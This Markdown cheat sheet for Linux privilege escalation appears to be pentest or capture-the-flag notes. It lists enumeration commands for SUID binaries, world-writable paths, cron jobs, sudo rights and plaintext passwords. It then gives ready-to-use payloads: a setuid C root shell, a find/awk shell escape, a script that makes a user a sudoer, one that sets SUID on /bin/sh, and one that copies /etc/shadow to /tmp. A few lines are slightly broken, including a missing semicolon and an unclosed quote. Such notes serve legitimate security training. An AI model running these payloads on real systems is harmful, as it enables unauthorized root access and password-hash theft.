#### Check kernel version
- uname -a

#### Environmental variables
- cat /etc/profile
- cat /etc/bashrc
- cat ~/.bash_profile
- cat ~/.bashrc
- cat ~/.bash_logout

#### Check common location for user installed software
- /usr/local/
- /usr/local/src
- /usr/local/bin
- /opt/
- /home
- /var/
- /usr/src/

#### Available services
- netstat -anlp
- netstat -ano

#### Running services
- ps aux | grep root
- ps -ef | grep root
- top
- cat /etc/services

#### Plain text usernames and/or password
- grep -i user [filename]
- grep -i pass [filename]
- grep -C 5 "password" [filename]
- find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla

#### Unmounted filesystem
- mount -l
- cat /etc/fstab

#### Access to more binaries
- export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

#### Searching SUID file (SUID file is a special type of file permission given to a file
- find / -perm -u=s -type f 2>/dev/null
- find / -perm -4000 -type f 2>/dev/null
- find / -uid 0 -perm -4000 -type f 2>/dev/null
- find / -type f -perm -g+s -exec ls -ald {} \; 2>/dev/null

#### Find 
- find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' ;

#### Find world writable files
- find / -writable -type d 2>/dev/null
- find / -perm -222 -type d 2>/dev/null
- find / -perm -o w -type d 2>/dev/null
- find / ! -path "*/proc/*" -perm -2 -type f -print 2>/dev/null

##### Find world writable folder
- find / -perm -o x -type d 2>/dev/null

##### Find world writable and executable folders
- find / \( -perm -o w -perm -o x \) -type d 2>/dev/null

#### Execute file as root
- sudo -l

#### Installed apps
- ls -alh /usr/bin/
- ls -alh /sbin/
- dpkg -l
- rpm -qa
- ls -alh /var/cache/apt/archivesO
- ls -alh /var/cache/yum/

#### Services misconfigured
- cat /etc/syslog.conf
- cat /etc/chttp.conf
- cat /etc/lighttpd.conf
- cat /etc/cups/cupsd.conf
- cat /etc/inetd.conf
- cat /etc/apache2/apache2.conf
- cat /etc/my.conf
- cat /etc/httpd/conf/httpd.conf
- cat /opt/lampp/etc/httpd.conf
- ls -aRl /etc/ | awk '$1 ~ /^.*r.*/

#### World writable directories
- /tmp
- /var/tmp
- /dev/shm
- /var/spool/vbox
- /var/spool/samba

#### Cronjobs
- crontab -l
- ls -alh /var/spool/cron
- ls -al /etc/ | grep cron
- ls -al /etc/cron*
- ls -alh -R /etc/cron*

#### Create usefull C file
int main()
{
  setuid(0);
  setgid(0);
  execl("/bin/sh", "sh", 0)
}

#### Create usefull bash script

##### Make a user sudoer
```
#!/bin/bash
adduser test sudo
```

##### Get a root shell
```
#!/bin/bash
chown root:root /bin/sh ; chmod 4777 /bin/sh

run: /bin/sh
```

##### Read /etc/shadow
```
#!/bin/bash
cat /etc/shadow > /tmp/shadow
```



#### Run usefull script for linux enumeration
- ***Linenum***: https://github.com/rebootuser/LinEnum
- ***Linuxprivchecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxExploitSuggester***: https://github.com/mzet-/linux-exploit-suggester
- ***LinuxExploitSuggester2***: https://github.com/jondonas/linux-exploit-suggester-2
- ***LinuxPrivChecker***: https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py
- ***LinuxSmartEnumeration***: https://github.com/diego-treitos/linux-smart-enumeration

#### 6) Enumerate /var directory and uncommon files and directory names

